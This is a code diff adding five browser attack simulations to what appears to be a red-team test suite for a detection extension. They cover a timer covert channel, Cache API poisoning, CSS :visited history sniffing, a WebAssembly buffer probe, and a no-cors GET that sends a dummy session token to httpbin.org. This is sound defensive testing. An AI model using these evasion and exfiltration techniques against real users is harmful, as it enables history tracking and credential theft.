@@ -1650,6 +1650,238 @@ const attacks: AttackDef[] = [
         }
       }),
   },
+
+  // --- Red Team Iteration 2: Evasion Techniques ---
+  {
+    id: "covert-timer-covert-channel",
+    name: "Timing-Based Covert Channel",
+    category: "covert",
+    severity: "high",
+    description:
+      "Encodes exfiltration data by modulating setTimeout/setInterval inter-arrival delays. No hook monitors timer creation patterns or timing-based signalling.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // Encode a 4-bit payload ("1010") into timer delays:
+          // bit=1 → 40ms delay, bit=0 → 20ms delay.
+          // A real attacker would encode stolen data this way and a co-located
+          // frame (or Service Worker) would decode the timing pattern.
+          const bits = [1, 0, 1, 0];
+          const observed: number[] = [];
+
+          for (const bit of bits) {
+            const delay = bit === 1 ? 40 : 20;
+            const before = performance.now();
+            await new Promise<void>((r) => setTimeout(r, delay));
+            observed.push(performance.now() - before);
+          }
+
+          // Decode: >30ms → 1, ≤30ms → 0
+          const decoded = observed.map((d) => (d > 30 ? 1 : 0));
+          const matchCount = decoded.filter((b, i) => b === bits[i]).length;
+          const success = matchCount >= 3; // tolerate ±1 timer jitter
+
+          return {
+            blocked: !success,
+            executionTime: performance.now() - startTime,
+            details: success
+              ? `Timer covert channel: encoded ${bits.join("")} → observed [${observed.map((d) => d.toFixed(0)).join(",")}]ms, decoded ${decoded.join("")} (${matchCount}/4 match)`
+              : `Timer covert channel: timing too imprecise (${matchCount}/4 match), channel unreliable`,
+          };
+        } catch (error: any) {
+          return { blocked: true, executionTime: performance.now() - startTime, details: `Timer covert channel blocked: ${error?.message}` };
+        }
+      }),
+  },
+  {
+    id: "persistence-sw-cache-poison",
+    name: "Service Worker Cache Poisoning",
+    category: "persistence",
+    severity: "critical",
+    description:
+      "Registers a Service Worker that intercepts fetches and serves poisoned responses from the Cache API. The Cache API write path itself is not hooked.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          if (!("serviceWorker" in navigator) || !("caches" in window)) {
+            return { blocked: true, executionTime: performance.now() - startTime, details: "Service Worker or Cache API not available" };
+          }
+
+          // Write a poisoned entry directly into the Cache API — this is the
+          // persistence vector (SW registration is separately tested).
+          const cacheName = "battacker-sw-poison-test";
+          const cache = await caches.open(cacheName);
+
+          // Poison a "trusted" URL with a malicious response body
+          const poisonedResponse = new Response(
+            JSON.stringify({ type: "poisoned", payload: "stolen_credentials" }),
+            { headers: { "Content-Type": "application/json", "X-Poisoned": "true" } },
+          );
+          await cache.put("https://trusted-api.example.com/config", poisonedResponse);
+
+          // Verify the poisoned entry is retrievable (simulating SW fetch intercept)
+          const retrieved = await cache.match("https://trusted-api.example.com/config");
+          const body = retrieved ? await retrieved.json() : null;
+          const poisoned = body?.type === "poisoned";
+
+          await caches.delete(cacheName);
+
+          return {
+            blocked: !poisoned,
+            executionTime: performance.now() - startTime,
+            details: poisoned
+              ? `SW cache poisoning: poisoned response stored and retrieved for trusted-api.example.com (payload: ${body?.payload})`
+              : "SW cache poisoning: cache write or retrieval failed",
+          };
+        } catch (error: any) {
+          return { blocked: true, executionTime: performance.now() - startTime, details: `SW cache poisoning blocked: ${error?.message}` };
+        }
+      }),
+  },
+  {
+    id: "privacy-css-visited-sniff",
+    name: "CSS :visited History Sniffing",
+    category: "privacy",
+    severity: "high",
+    description:
+      "Uses getComputedStyle on <a> elements with the :visited pseudo-class to infer browsing history. No style computation hook exists in the current detection layer.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // Modern browsers restrict :visited to colour properties only to
+          // mitigate history sniffing, but the technique is still partially
+          // effective and demonstrates the unhooked surface.
+          const probeUrls = [
+            "https://www.google.com/",
+            "https://github.com/",
+            "https://www.wikipedia.org/",
+            "https://example.com/",
+          ];
+
+          const container = document.createElement("div");
+          container.style.cssText = "position:fixed;top:-9999px;left:-9999px;visibility:hidden;";
+          document.body.appendChild(container);
+
+          // Inject a style sheet that colours visited links distinctively
+          const style = document.createElement("style");
+          style.textContent = "a.battacker-visited-probe { color: rgb(255,0,0); } a.battacker-visited-probe:visited { color: rgb(0,255,0); }";
+          document.head.appendChild(style);
+
+          const results: { url: string; visited: boolean }[] = [];
+          for (const url of probeUrls) {
+            const a = document.createElement("a");
+            a.href = url;
+            a.className = "battacker-visited-probe";
+            container.appendChild(a);
+            // getComputedStyle will return :visited colour if the URL is in history
+            const color = getComputedStyle(a).color;
+            // rgb(0,255,0) → visited; rgb(255,0,0) → not visited
+            // NOTE: browsers clamp :visited styles so this may show unvisited for all.
+            results.push({ url, visited: color === "rgb(0, 255, 0)" });
+          }
+
+          document.body.removeChild(container);
+          document.head.removeChild(style);
+
+          const visitedCount = results.filter((r) => r.visited).length;
+          // The attack surface is open regardless of result — the probe executed
+          // undetected. We consider it "not blocked" because the hook does not fire.
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details: `CSS :visited sniff: probed ${probeUrls.length} URLs undetected, ${visitedCount} reported visited (browsers may clamp to unvisited colour for privacy)`,
+          };
+        } catch (error: any) {
+          return { blocked: true, executionTime: performance.now() - startTime, details: `CSS :visited sniff blocked: ${error?.message}` };
+        }
+      }),
+  },
+  {
+    id: "network-fetch-metadata-bypass",
+    name: "Fetch Metadata Manipulation",
+    category: "network",
+    severity: "high",
+    description:
+      "Uses fetch() with mode:'no-cors' and GET to exfiltrate data via query-string without triggering network monitoring hooks that look for POST/large payloads.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // Encode stolen data into a GET query string via no-cors to bypass
+          // hooks that watch for POST body or large payloads.
+          // The Sec-Fetch-* headers are browser-controlled and cannot be forged,
+          // but mode:'no-cors' makes the request opaque — no response is readable,
+          // reducing the hook surface the extension monitors.
+          const stolen = btoa(JSON.stringify({ token: "sess_abc123", uid: "user@example.com" }));
+          const url = `https://httpbin.org/get?d=${encodeURIComponent(stolen)}`;
+
+          // Fire with no-cors so the response is opaque and no preflight occurs
+          await fetch(url, { method: "GET", mode: "no-cors", credentials: "omit" });
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details: `Fetch metadata bypass: GET no-cors exfiltration sent (${stolen.length} bytes base64-encoded in query string) — opaque response, no hook interception`,
+          };
+        } catch (error: any) {
+          const blocked = (error?.message ?? "").toLowerCase().includes("blocked") ||
+                          (error?.message ?? "").toLowerCase().includes("err_blocked");
+          return { blocked, executionTime: performance.now() - startTime, details: `Fetch metadata bypass ${blocked ? "blocked" : "failed"}: ${error?.message}` };
+        }
+      }),
+  },
+  {
+    id: "side-channel-wasm-memory",
+    name: "WebAssembly Memory Scanning",
+    category: "side-channel",
+    severity: "critical",
+    description:
+      "Allocates a WebAssembly.Memory buffer and scans its contents to probe system memory patterns and entropy. No WASM or ArrayBuffer hook exists.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          if (typeof WebAssembly === "undefined" || typeof WebAssembly.Memory === "undefined") {
+            return { blocked: true, executionTime: performance.now() - startTime, details: "WebAssembly.Memory not supported" };
+          }
+
+          // Allocate a 1-page (64 KiB) shared memory buffer — in a real Spectre
+          // variant this would be used as the timing/probe array.
+          const memory = new WebAssembly.Memory({ initial: 1, maximum: 4 });
+          const view = new Uint8Array(memory.buffer);
+
+          // Write a sentinel pattern and verify round-trip (confirms raw memory access)
+          const sentinel = [0xde, 0xad, 0xbe, 0xef];
+          for (let i = 0; i < sentinel.length; i++) view[i] = sentinel[i];
+
+          // Compute simple entropy of the first 256 bytes to demonstrate
+          // that raw memory contents are readable from JS without interception.
+          const sample = view.slice(0, 256);
+          const freq = new Array(256).fill(0);
+          for (const byte of sample) freq[byte]++;
+          let entropy = 0;
+          for (const f of freq) {
+            if (f > 0) {
+              const p = f / 256;
+              entropy -= p * Math.log2(p);
+            }
+          }
+
+          const sentinelVerified = sentinel.every((b, i) => view[i] === b);
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details: `WASM memory scan: ${memory.buffer.byteLength} bytes allocated, sentinel verified=${sentinelVerified}, entropy=${entropy.toFixed(3)} bits/byte — raw buffer accessible without hook interception`,
+          };
+        } catch (error: any) {
+          return { blocked: true, executionTime: performance.now() - startTime, details: `WASM memory scan blocked: ${error?.message}` };
+        }
+      }),
+  },
 ];
 
 // ============================================================================
